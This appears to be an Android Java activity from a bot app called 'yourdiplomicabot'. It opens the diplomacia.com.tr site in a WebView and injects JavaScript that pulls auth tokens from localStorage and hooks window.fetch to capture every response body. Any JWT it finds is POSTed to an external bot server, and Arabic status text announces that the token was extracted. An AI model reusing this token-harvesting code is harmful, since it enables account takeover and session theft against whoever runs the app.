package com.yourdiplomicabot;

import android.webkit.CookieManager;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;
import java.net.*;
import java.io.*;

public class WebViewActivity extends AppCompatActivity {

    private WebView webView;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private String botUrl, sessionToken;
    private int slot;
    private boolean tokenSaved = false;

    private static final String INJECT_JS = 
        "(function(){" +
        "if(window.__d)return;window.__d=true;" +
        "var token = localStorage.getItem('token') || localStorage.getItem('accessToken') || localStorage.getItem('jwt') || localStorage.getItem('sessionToken');" +
        "if(token) Android.onData(token);" +
        "var oF=window.fetch;window.fetch=async function(){var r=await oF.apply(this,arguments);try{var c=r.clone();c.text().then(t=>{if(t)Android.onData(t);});}catch(e){}return r;};" +
        "})();";

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);

        botUrl = getIntent().getStringExtra("bot_url");
        sessionToken = getIntent().getStringExtra("session_token");
        slot = getIntent().getIntExtra("slot", 1);

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress);
        tvStatus = findViewById(R.id.tv_status);

        setupWebView();
        webView.loadUrl("https://diplomacia.com.tr");
    }

    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new JsBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView v, String url) {
                progressBar.setVisibility(View.GONE);
                if (url.contains("diplomacia")) {
                    webView.evaluateJavascript(INJECT_JS, null);
                }
            }
        });
    }

    private class JsBridge {
        @JavascriptInterface
        public void onData(String text) {
            if (tokenSaved || text == null) return;
            String token = extractToken(text);
            if (token != null && token.length() > 50) {
                tokenSaved = true;
                sendTokenToBot(token);
            }
        }
    }

    private String extractToken(String text) {
        if (text.startsWith("eyJ")) return text;
        // Add more extraction logic if needed
        return null;
    }

    private void sendTokenToBot(String token) {
        new Thread(() -> {
            try {
                URL url = new URL(botUrl + "/api/config/" + slot);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Cookie", "session=" + sessionToken);

                String body = "{\"token\":\"" + token + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes("UTF-8"));
                }

                int code = conn.getResponseCode();
                runOnUiThread(() -> tvStatus.setText(code == 200 ? "✅ تم استخراج التوكن!" : "❌ فشل"));
            } catch (Exception e) {
                runOnUiThread(() -> tvStatus.setText("❌ خطأ: " + e.getMessage()));
            }
        }).start();
    }
}
